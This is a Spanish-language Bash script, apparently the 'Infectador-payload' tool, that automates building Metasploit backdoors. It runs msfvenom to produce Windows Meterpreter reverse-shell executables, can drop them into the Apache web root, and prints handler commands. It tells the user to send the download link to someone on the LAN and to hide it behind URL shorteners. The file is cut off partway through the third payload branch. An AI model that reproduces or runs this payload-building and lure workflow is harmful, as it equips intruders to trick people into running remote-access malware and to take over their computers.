#!/bin/bash 

function creditos(){

echo -e "\e[1;35m-------------------------------------------------"
sleep 0.2
echo -e "             \e[0;32mDejame una \e[1;33m★ \e[0;32men GitHub              "
sleep 0.2
echo -e "\e[1;32mhttps://github.com/WackyHacker/Infectador-payload"  
sleep 0.2
echo -e "                   \e[1;32m« \e[0;32mGRACIAS \e[1;32m»                   "
sleep 0.2
echo -e "\e[1;35m-------------------------------------------------"
sleep 0.2
}

function advertencia(){

clear
if ! [ $(id -u) = 0 ]; then
	echo -e "\e[1;30m------------------------------------------------------------------------------"
	echo -e "\e[0;32mPara ejecutar esta herramienta al 100% debes usar \e[1;32m» sudo su \e[1;32m« "
	echo -e "\e[0;32mcuando ya seas usuario root ejecuta \e[1;32m» bash Infectador-payload.sh \e[1;32m«"
	echo -e "\e[0;32msi no se inicia con usuario root puede que la herramienta no funcione bien"
	echo -e "\e[1;30m------------------------------------------------------------------------------"
	sleep 2
	exit
else	
	echo -e "\e[1;30m------------------------------------------------------------------------------"
	echo -e "\e[0;32m   ANTES DE USAR ESTA HERRAMIENTA USA EL COMANDO \e[1;32mmkdir Backdoors" 
	echo -e "\e[1;30m------------------------------------------------------------------------------"
	echo -e "\e[0;32mPara ejecutar esta herramienta al 100% debes usar \e[1;32m» sudo su \e[1;32m« "
	echo -e "\e[0;32mcuando ya seas usuario root ejecuta \e[1;32m» bash Infectador-payload.sh \e[1;32m«"
	echo -e "\e[0;32msi no se inicia con usuario root puede que la herramienta no funcione bien"
	echo -e "\e[1;30m------------------------------------------------------------------------------"
	echo ""
	read -p  $"Para ENTER para seguir" enter
                                        
	if [[ $enter == "" ]]; then 
		banner 
	else
		echo -e "\e[1;31mNo puedes seguir sin pulsar la tecla q"
		echo ""
		sleep 2
		clear
		creditos
		exit
	fi
fi
}


function internet(){ 
clear 
echo -e "\e[1;32m{Verificando si estas conectado a Internet}"
sleep 1.5
echo ""
ping -c 1 google.com > /dev/null 2>&1
if [ "$?" == 0 ]; then
echo ""
echo -e  "\e[1;32mConectado a Internet [✔]"
sleep 1
else
echo ""
echo "\e[1;31mNo conectado a Internet [!]"
sleep 1.5
exit
fi
}
advertencia
internet

#    Negro = \e[0;30m
#    Gris oscuro = \e[1;30m
#    Azul = \e[0;34m
#    Azul resaltado = \e[1;34m
#    Verde = \e[0;32m
#    Verde resaltado = \e[1;32m
#    Cian = \e[0;36m
#    Cyan resaltado = \e[1;36m
#    Rojo = \e[0;31m
#    Rojo resaltado = \e[1;31m
#    Púrpura = \e[0;35m
#    Púrpura resaltado = \e[1;35m
#    Café = \e[0;33m
#    Amarillo = \e[1;33m
#    Gris = \e[0;37m
#    Blanco = \e[1;37m

function banner(){ 
clear
sleep 0.01
echo -e "\e[1;35m★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★"
sleep 0.01
echo -e " \e[0;36m___ _   _ _____ _____ ____ _____  _    ____   ___  ____   " 
sleep 0.01
echo -e "\e[0;36m|_ _| \ | |  ___| ____/ ___|_   _|/ \  |  _ \ / _ \|  _ \  "
sleep 0.01
echo -e " \e[0;36m| ||  \| | |_  |  _|| |     | | / _ \ | | | | | | | |_) | "
sleep 0.01
echo -e " \e[0;36m| || |\  |  _| | |__| |___  | |/ ___ \| |_| | |_| |  _ <  "
sleep 0.01
echo -e "\e[0;36m|___|_| \_|_|   |_____\____| |_/_/   \_\____/ \___/|_| \_| "
sleep 0.01
echo -e "\e[1;36m┏━┓┏━┓╻ ╻╻  ┏━┓┏━┓╺┳┓      "
sleep 0.01
echo -e "\e[1;36m┣━┛┣━┫┗┳┛┃  ┃ ┃┣━┫ ┃┃  Created by \e[1;34mWackyHacker   "
sleep 0.01
echo -e "\e[1;36m╹  ╹ ╹ ╹ ┗━╸┗━┛╹ ╹╺┻┛  \e[1;35mVersion 1.0 \e[1;36mUSO \e[1;32m» AUTOMATICO « "
sleep 0.01
echo -e "\e[1;35m-----------------------------------------------------------"
sleep 0.01
echo -e "\e[0;34m[HACKEA CON SEGURIDAD I NO LO HAGAS POR VENGANZA]   "  
sleep 0.01
echo -e "\e[0;34m GITHUB: \e[1;36mhttps://github.com/WackyHacker "
sleep 0.01
echo -e "\e[1;35m★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★"
echo ""
}



banner

function payload(){
echo -e  " \e[0;34m____   _ __   ___     ___    _    ____  "
echo -e "\e[0;34m|  _ \ / \| \ / / |   / _ \  / \  |  _ \ "
echo -e "\e[0;34m| |_) / _ \  V /| |  | | | |/ _ \ | | | |"
echo -e "\e[0;34m|  __/ ___ \| | | |__| |_| / ___ \| |_| |"
echo -e "\e[0;34m|_| /_/   \_\_| |_____\___/_/   \_\____/"
echo -e "\e[1;35m★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★"
echo ""
}

function ngrok(){

echo -e  "  \e[0;34m_ __   __ _ _ __ ___ | | __"
echo -e  " \e[0;34m| '_ \ / _  | '__/ _ \| |/ /"
echo -e  " \e[0;34m| | | | (_| | | | (_) |   < "
echo -e  " \e[0;34m|_| |_|\__, |_|  \___/|_|\_|"
echo -e  	" \e[0;34m|___/                "
echo -e "\e[1;35m★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★"
echo ""   
echo -e "\e[1;31mEsta opcion esta en MANTENIMIENTO"
}


function banner3(){
echo -e "\e[0;34m__      _(_)_ __   __| | _____      _____ "
echo -e "\e[0;34m\ \ /\ / / | '_ \ / _  |/ _ \ \ /\ / / __|"
echo -e " \e[0;34m\ V  V /| | | | | (_| | (_) \ V  V /\__ |"
echo -e "  \e[0;34m\_/\_/ |_|_| |_|\__,_|\___/ \_/\_/ |___/" 
echo -e "\e[1;35m★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★"
echo ""   
}     

function banner4(){
echo -e " \e[0;34m_     _                   "                                                                                                                                           
echo -e "\e[0;34m| |   (_)_ __  _   ___  __ "                                                                                                                                         
echo -e "\e[0;34m| |   | | '_ \| | | \ \/ / "                                                                                                                                          
echo -e "\e[0;34m| |___| | | | | |_| |>  <  "                                                                                                                                           
echo -e "\e[0;34m|_____|_|_| |_|\__,_/_/\_\ " 
echo -e "\e[1;35m★━━━━━━━━━━━━━━━━━━━━━━━━━━★"
echo ""                                    
}

function banner5(){

echo -e "    \e[0;34m_    _   _ ____  ____   ___ ___ ____ "                                                                                                                             
echo -e "   \e[0;34m/ \  | \ | |  _ \|  _ \ / _ \_ _|  _ \ "                                                                                                                            
echo -e "  \e[0;34m/ _ \ |  \| | | | | |_) | | | | || | | | "                                                                                                                           
echo -e " \e[0;34m/ ___ \| |\  | |_| |  _ <| |_| | || |_| |  "                                                                                                                          
echo -e "\e[0;34m/_/   \_\_| \_|____/|_| \_|\___/___|____/    " 
echo -e "\e[1;35m★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★"
echo ""                                                                                                                      
} 

function banner6(){

echo -e " \e[0;34m__  __    _    ____    ___  ____  "
echo -e "\e[0;34m|  \/  |  / \  / ___|  / _ \/ ___| "
echo -e "\e[0;34m| |\/| | / _ \| |     | | | \___ \ "
echo -e "\e[0;34m| |  | |/ ___ \ |___  | |_| |___) |"
echo -e "\e[0;34m|_|  |_/_/   \_\____|  \___/|____/ "
echo -e "\e[1;35m★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★"
echo ""
}  

function banner7(){

echo -e " \e[0;34m____        _   _  "                                                                                                                                                  
echo -e "\e[0;34m|  _ \ _   _| |_| |__   ___  _ __ "                                                                                                                                    
echo -e "\e[0;34m| |_) | | | | __| '_ \ / _ \| '_ \ "                                                                                                                                   
echo -e "\e[0;34m|  __/| |_| | |_| | | | (_) | | | | "                                                                                                                                  
echo -e "\e[0;34m|_|    \__, |\__|_| |_|\___/|_| |_|"
echo -e "       \e[0;34m|___/                       "
echo -e "\e[1;35m★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★"
echo ""                             
}

function banner8(){

echo -e " \e[0;34m____  _   _ ____ " 
echo -e "\e[0;34m|  _ \| | | |  _ \ "
echo -e "\e[0;34m| |_) | |_| | |_) |"
echo -e "\e[0;34m|  __/|  _  |  __/ "
echo -e "\e[0;34m|_|   |_| |_|_|    "
echo -e "\e[1;35m★━━━━━━━━━━━━━━━━━━━★"
echo ""
}

function banner9(){

echo -e " \e[0;34m____            _     "
echo -e "\e[0;34m| __ )  __ _ ___| |__  "
echo -e "\e[0;34m|  _ \ / _' / __| '_ \ "
echo -e "\e[0;34m| |_) | (_| \__ \ | | |"
echo -e "\e[0;34m|____/ \__,_|___/_| |_|"
echo -e "\e[1;35m★━━━━━━━━━━━━━━━━━━━━━━━★"
echo ""
} 

function banner10(){

echo -e " \e[0;34m____  _____ ____  _    " 
echo -e "\e[0;34m|  _ \| ____|  _ \| |    "
echo -e "\e[0;34m| |_) |  _| | |_) | |    "
echo -e "\e[0;34m|  __/| |___|  _ <| |___ "
echo -e "\e[0;34m|_|   |_____|_| \_\_____|"
echo -e "\e[1;35m★━━━━━━━━━━━━━━━━━━━━━━━━━★"
echo ""
}
                      

function banner2(){
sleep 0.05
echo -e "\e[1;34m[1] Payload-Windows"
sleep 0.05
echo -e "\e[1;34m[2] Payload-Linux       "
sleep 0.05
echo -e "\e[1;34m[3] Payload-Android"
sleep 0.05
echo -e "\e[1;34m[4] Payload-MAC OS       "
sleep 0.05
echo -e "\e[1;34m[5] Payload-Python    "
sleep 0.05
echo -e "\e[1;34m[6] Payload-PHP       "
sleep 0.05
echo -e "\e[1;34m[7] Payload-Bash      "
sleep 0.05
echo -e "\e[1;34m[8] Payload-Perl" 
sleep 0.05
echo -e "\e[1;34m[99] Instalar Ngrok"
sleep 0.05 
echo -e "\e[1;36m"
read -p $"Infectar > " option

if [[ $option == 1 || $option == 01 ]]; then
clear
banner3
echo -e                  "\e[0;36m[\e[0;34m01\e[0;36m] \e[1;36mwindows/x64/meterpreter_reverse_http "
echo -e                  "\e[0;36m[\e[0;34m02\e[0;36m] \e[1;36mwindows/x64/meterpreter_reverse_https"
echo -e                  "\e[0;36m[\e[0;34m03\e[0;36m] \e[1;36mwindows/x64/meterpreter_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m04\e[0;36m] \e[1;36mwindows/x64/meterpreter/reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m05\e[0;36m] \e[1;36mwindows/x64/powershell_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m06\e[0;36m] \e[1;36mwindows/x64/shell_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m07\e[0;36m] \e[1;36mwindows/meterpreter_reverse_http"
echo -e                  "\e[0;36m[\e[0;34m08\e[0;36m] \e[1;36mwindows/meterpreter_reverse_https"
echo -e                  "\e[0;36m[\e[0;34m09\e[0;36m] \e[1;36mwindows/meterpreter_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m10\e[0;36m] \e[1;36mwindows/meterpreter/reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m11\e[0;36m] \e[1;36mwindows/meterpreter/reverse_tcp_dns"
echo -e                  "\e[0;36m[\e[0;34m12\e[0;36m] \e[1;36mwindows/metsvc_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m13\e[0;36m] \e[1;36mwindows/powershell_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m14\e[0;36m] \e[1;36mwindows/shell_reverse_tcp "
echo ""
read -p $"Payload > " optiondos

	if [[ $optiondos == 1 || $optiondos == 01 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mwindows/x64/meterpreter_reverse_http"
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi

	  elif [[ $optiondos == 2 || $optiondos == 02 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mwindows/x64/meterpreter_reverse_https"
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	  elif [[ $optiondos == 3 || $optiondos == 03 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mwindows/x64/meterpreter_reverse_tcp"
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
